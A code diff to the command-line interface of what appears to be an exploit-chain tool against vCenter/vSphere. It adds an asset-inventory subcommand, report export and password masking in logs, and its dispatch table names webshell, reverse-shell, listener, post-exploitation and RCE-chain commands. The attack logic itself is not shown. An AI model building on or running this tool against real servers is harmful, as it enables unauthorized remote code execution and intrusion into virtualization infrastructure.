@@ -140,11 +140,20 @@ def build_parser():
                    help="跳过 59310 机器账户路径")
     s.add_argument("--skip-59309", dest="use_59309", action="store_false",
                    help="跳过 59309 SRP 路径")
+    s.add_argument("--no-inventory", dest="inventory", action="store_false",
+                   help="交付后不做 vSphere 资产盘点")
+    s.add_argument("--report", default=None, help="导出 Markdown 测试报告路径")
     s.add_argument("--proto", choices=["udp", "tcp", "tls"], default="udp")
     s.add_argument("--port", type=int, default=514)
     s.add_argument("--vami-port", type=int, default=5480)
     s.add_argument("--wait", type=int, default=200)
     s.add_argument("--proxy", default=None)
+
+    s = sub.add_parser("mgmt", help="vSphere 资产盘点（REST 只读，用合法 SSO 账户）")
+    s.add_argument("host")
+    s.add_argument("--user", required=True, help="SSO 账户（如 user@vsphere.local）")
+    s.add_argument("--pass", dest="password", required=True)
+    s.add_argument("--port", type=int, default=443)
     return p
 
 
@@ -397,9 +406,25 @@ def cmd_chain(a):
     r = run_chain(a.host, user=a.user, password=a.password,
                   use_59310=a.use_59310, use_59309=a.use_59309,
                   syslog_port=a.port, proto=a.proto, vami_port=a.vami_port,
-                  proxy=a.proxy, rce_wait=a.wait, log=print)
+                  proxy=a.proxy, rce_wait=a.wait, inventory=a.inventory,
+                  log=print)
     print("\n" + r.card)
+    if a.report:
+        with open(a.report, "w", encoding="utf-8") as fp:
+            fp.write(r.report_markdown())
+        print("[+] 报告已导出: %s" % a.report)
     return 0 if r.ok else 1
+
+
+def cmd_mgmt(a):
+    from .mgmt import gather_inventory, MgmtError
+    try:
+        print(gather_inventory(a.host.split(":")[0], a.user, a.password,
+                               port=a.port))
+        return 0
+    except MgmtError as e:
+        print("[-] %s" % e)
+        return 1
 
 
 def cmd_postex(a):
@@ -447,7 +472,13 @@ def main(argv=None):
     logutil.start("cli")
     logutil.install_stdout_tee()
     logutil.install_excepthook()
-    logutil.write("i", "argv: %s" % " ".join(argv))
+    safe = list(argv)
+    for i, tok in enumerate(safe):
+        if tok.lower() in ("--pass", "--password") and i + 1 < len(safe):
+            safe[i + 1] = "***"
+        if tok.lower().startswith(("--pass=", "--password=")):
+            safe[i] = tok.split("=", 1)[0] + "=***"
+    logutil.write("i", "argv: %s" % " ".join(safe))
     try:
         if a.cmd == "selftest":
             rc = run_selftest()
@@ -464,7 +495,7 @@ def _dispatch(a):
           "webshell": cmd_webshell, "revshell": cmd_revshell,
           "listen": cmd_listen, "check59309": cmd_check59309,
           "ldap59309": cmd_ldap59309, "postex": cmd_postex,
-          "chain": cmd_chain}[a.cmd]
+          "chain": cmd_chain, "mgmt": cmd_mgmt}[a.cmd]
     try:
         return fn(a)
     except (ConnectionError, OSError, ValueError, ssl.SSLError) as e:
